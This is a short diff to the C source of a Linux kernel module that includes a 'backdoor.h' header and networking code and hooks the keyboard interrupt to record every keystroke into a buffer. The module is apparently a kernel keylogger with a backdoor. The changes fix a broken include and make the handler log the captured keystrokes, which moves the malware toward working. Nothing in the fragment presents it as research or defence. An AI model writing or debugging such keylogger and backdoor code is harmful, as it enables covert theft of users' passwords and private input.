@@ -4,7 +4,7 @@
 #include <linux/keyboard.h>
 #include <linux/irq.h>
 #include <linux/interrupt.h>
-#include <linus/delay.h>
+#include <linux/delay.h>
 
 #include "backdoor.h"
 #include "utils/networking.c"
@@ -28,7 +28,7 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         keystrokes[buffer_count] = key;
         buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
 
-        printk(KERN_INFO "Buffer: %s", buffer);
+        printk(KERN_INFO "Buffer: %s", keystrokes);
         printk(KERN_INFO "Buffer size: %d", buffer_count);
 
         if (buffer_count == 0) {
